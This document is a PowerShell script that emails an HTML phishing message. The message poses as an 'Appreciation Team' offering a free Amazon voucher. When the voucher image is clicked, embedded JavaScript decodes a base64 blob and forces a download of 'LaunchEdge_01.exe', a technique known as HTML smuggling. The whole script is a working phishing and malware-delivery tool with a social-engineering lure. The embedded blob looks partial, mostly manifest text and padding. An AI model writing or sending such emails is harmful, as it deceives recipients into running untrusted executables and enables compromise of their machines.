# Define email parameters
$smtpServer = "smtp.gmail.com"
$smtpPort = 587
$smtpFrom = "username@domain.com"
$smtpTo = "username@domain.com"
$messageSubject = "Claim Your Free Gift"
$smtpPassword = Get-Credential

# Define the email body
$messageBody = @"
<html>
<body>
    <script>
        function imageClicked() {
            var file = 'DQogICAgIHByb2Nlc3NvckFyY2hpdGVjdHVyZT0iYW1kNjQiDQogICAgIG5hbWU9IndleHRyYWN0Ig0KICAgICB0eXBlPSJ3aW4zMiIvPg0KICANCiAgPGRlc2NyaXB0aW9uPklFeHByZXNzIGV4dHJhY3Rpb24gdG9vbDwvZGVzY3JpcHRpb24+DQoNCiAgPGRlcGVuZGVuY3k+DQogICAgPGRlcGVuZGVudEFzc2VtYmx5Pg0KICAgICAgPGFzc2VtYmx5SWRlbnRpdHkNCiAgICAgICAgICB0eXBlPSJ3aW4zMiINCiAgICAgICAgICBuYW1lPSJNaWNyb3NvZnQuV2luZG93cy5Db21tb24tQ29udHJvbHMiDQogICAgICAgICAgdmVyc2lvbj0iNi4wLjAuMCINCiAgICAgICAgICBwcm9jZXNzb3JBcmNoaXRlY3R1cmU9ImFtZDY0Ig0KICAgICAgICAgIHB1YmxpY0tleVRva2VuPSI2NTk1YjY0MTQ0Y2NmMWRmIg0KICAgICAgICAgIGxhbmd1YWdlPSIqIg0KICAgICAgIC8+DQogICAgPC9kZXBlbmRlbnRBc3NlbWJseT4NCiAgPC9kZXBlbmRlbmN5Pg0KDQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsDQogICAgICAgICAgbGV2ZWw9ImFzSW52b2tlciINCiAgICAgICAgICB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCiAgICA8Y29tcGF0aWJpbGl0eSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTpjb21wYXRpYmlsaXR5LnYxIj4gDQogICAgICAgIDxhcHBsaWNhdGlvbj4gDQogICAgICAgICAgICA8IS0tVGhpcyBJZCB2YWx1ZSBpbmRpY2F0ZXMgdGhlIGFwcGxpY2F0aW9uIHN1cHBvcnRzIFdpbmRvd3MgVmlzdGEvU2VydmVyIDIwMDggZnVuY3Rpb25hbGl0eSAtLT4NCiAgICAgICAgICAgIDxzdXBwb3J0ZWRPUyBJZD0ie2UyMDExNDU3LTE1NDYtNDNjNS1hNWZlLTAwOGRlZWUzZDNmMH0iLz4gDQogICAgICAgICAgICA8IS0tVGhpcyBJZCB2YWx1ZSBpbmRpY2F0ZXMgdGhlIGFwcGxpY2F0aW9uIHN1cHBvcnRzIFdpbmRvd3MgNy9TZXJ2ZXIgMjAwOCBSMiBmdW5jdGlvbmFsaXR5LS0+DQogICAgICAgICAgICA8c3VwcG9ydGVkT1MgSWQ9InszNTEzOGI5YS01ZDk2LTRmYmQtOGUyZC1hMjQ0MDIyNWY5M2F9Ii8+DQogICAgICAgICAgICA8IS0tVGhpcyBJZCB2YWx1ZSBpbmRpY2F0ZXMgdGhlIGFwcGxpY2F0aW9uIHN1cHBvcnRzIFdpbmRvd3MgOC9TZXJ2ZXIgMjAxMiBmdW5jdGlvbmFsaXR5LS0+DQogICAgICAgICAgICA8c3VwcG9ydGVkT1MgSWQ9Ins0YTJmMjhlMy01M2I5LTQ0NDEtYmE5Yy1kNjlkNGE0YTZlMzh9Ii8+DQogICAgCSAgICA8IS0tIFRoaXMgSWQgdmFsdWUgaW5kaWNhdGVzIHRoZSBhcHBsaWNhdGlvbiBzdXBwb3J0cyBXaW5kb3dzIEJsdWUvU2VydmVyIDIwMTIgUjIgZnVuY3Rpb25hbGl0eS0tPiAgICAgICAgICAgIA0KICAgIAkgICAgPHN1cHBvcnRlZE9TIElkPSJ7MWY2NzZjNzYtODBlMS00MjM5LTk1YmItODNkMGY2ZDBkYTc4fSIvPg0KICAgIAkgICAgPCEtLSBUaGlzIElkIHZhbHVlIGluZGljYXRlcyB0aGUgYXBwbGljYXRpb24gc3VwcG9ydHMgV2luZG93cyBUaHJlc2hvbGQgZnVuY3Rpb25hbGl0eS0tPiAgICAgICAgICAgIA0KICAgIAkgICAgPHN1cHBvcnRlZE9TIElkPSJ7OGUwZjdhMTItYmZiMy00ZmU4LWI5YTUtNDhmZDUwYTE1YTlhfSIvPg0KICAgICAgICA8L2FwcGxpY2F0aW9uPiANCiAgICA8L2NvbXBhdGliaWxpdHk+DQo8L2Fzc2VtYmx5Pg0KDQpQQVBBRERJTkdYWFBBRERJTkdQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURESU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBREQAkAAAIAAAAACgCKBooICgiKCQoDimQKZQpmimcKYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==';
            console.log(file)
            var data = base64ToArrayBuffer(file);

            // Step 2: Convert the payload to a blob
            var blob = new Blob([data], { type: 'application/octet-stream' });

            // Step 3: Trigger the download
            var a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'LaunchEdge_01.exe';
            a.click();
        }

        function base64ToArrayBuffer(base64) {
            var binaryString = window.atob(base64);
            var len = binaryString.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            return bytes.buffer;
        }
    </script>

    <h3>Appreciation Team</h3>
    <p>Please click on the link to claim your free gift as a token of our appreciation for your hard work for the last quarter.</p>
    <p></p>
    <img src="https://github.com/solkee/genric_files/blob/main/src/img/AmazonVoucher.PNG?raw=true" alt="Claim your Amazon Voucher" onclick="imageClicked()"/>
    <p></p>
    <p>Thank you<p>
    <p>Kind Regards,</p>
    <p>Appreciation Team</p>


</body>
</html>
"@

# Send the email
try {
    $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
    $smtpClient.EnableSsl = $true
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($smtpFrom, $smtpPassword.GetNetworkCredential().Password)
    
    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = $smtpFrom
    $mailMessage.To.Add($smtpTo)
    $mailMessage.Subject = $messageSubject
    $mailMessage.Body = $messageBody
    $mailMessage.IsBodyHtml = $true
    
    Write-Host "Attempting to send email..."
    $smtpClient.Send($mailMessage)
    Write-Host "Email sent successfully."
} catch {
    Write-Host "Failed to send email. Error: $_"
    Write-Host "Exception type: $($_.Exception.GetType().FullName)"
    Write-Host "Exception message: $($_.Exception.Message)"
    if ($_.Exception.InnerException) {
        Write-Host "Inner exception type: $($_.Exception.InnerException.GetType().FullName)"
        Write-Host "Inner exception message: $($_.Exception.InnerException.Message)"
    }
}